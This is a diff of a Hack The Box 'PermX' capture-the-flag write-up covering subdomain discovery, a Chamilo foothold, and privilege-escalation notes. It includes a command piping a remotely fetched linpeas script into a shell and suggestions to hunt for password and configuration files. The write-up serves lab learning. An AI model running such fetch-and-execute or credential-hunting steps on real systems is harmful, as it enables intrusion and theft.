@@ -4,6 +4,10 @@ https://app.hackthebox.com/machines/PermX
 
 This is the first machine I pwned without any spoilers (from write-ups)
 
+> Astelor: Windows defender does not like php web shell in any file, this write-up is not a trojan >:(
+>
+> Or maybe it just doesn't like system calls.
+
 # Reconnaissance
 
 ## Nmap
@@ -124,13 +128,10 @@ The filter is added to filter out the junk responses.
 
 Adding the new sub-domain names to our `/etc/hosts` file.
 
-`www` hostname gives us the same page `http://permx.htb` gives us.
-
-`lms` gives us an webpage hosting an application called `chamilo`
+- `www` hostname gives us the same page `http://permx.htb` gives us.
+- `lms` gives us an webpage hosting an application called `chamilo`
 
 ![lms.permx.htb](attachments/htb-permx/htb-permx-lms.png)
-
-> my god the machine resets so frequently because of how the root flag is obtained and how easily someone can fuck up root files.
 
 ## Burpsuite
 
@@ -199,8 +200,6 @@ www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
 
 Then you can run `linpeas` on it
 
-> I guess a web shell could work too, but a reverse shell is easier to manage.
-
 # Privilege Escalation
 
 ## Linpeas
@@ -212,12 +211,23 @@ Running `linpeas` on the remote box.
 www-data@permx:/tmp/tmp.12345$ curl http://<local-ip>:5050/linpeas.sh | sh > linpeas.result
 ```
 
-How to read `linpeas` output file with color
-```
-less -r linpeas.result
+Reading `linpeas` output file with color
+```sh
+$ less -r linpeas.result
 ```
 
-After some digging
 
-- Since we were `www-data`, a low-level user, most of the application or `root` exploit wasn't likely to be done without normal `user` privilege.
-- I did't believe I can somehow pop a `root` shell on the web-facing application under `/var/www`
+After some digging, 
+
+
+# After Root
+
+My god the machine resets so frequently because of how the root flag is obtained and how easily someone can fuck up root files.
+
+## About linpeas and snooping around
+
+I checked almost every entries that linpeas flagged, and I had these takeaway:
+- Since we were `www-data`, a low-level user, most of the `root` exploit wasn't likely to be done without normal `user` privilege.
+- I did't believe I can somehow pop a `root` or `user` shell on the web-facing application under `/var/www`
+- This left us with credential stealing, which is ploughing through files named with `password` or `configuration`
+- Keep in mind `linpeas` checks within the file too, `cat`'ing individual flagged files isn't necessary
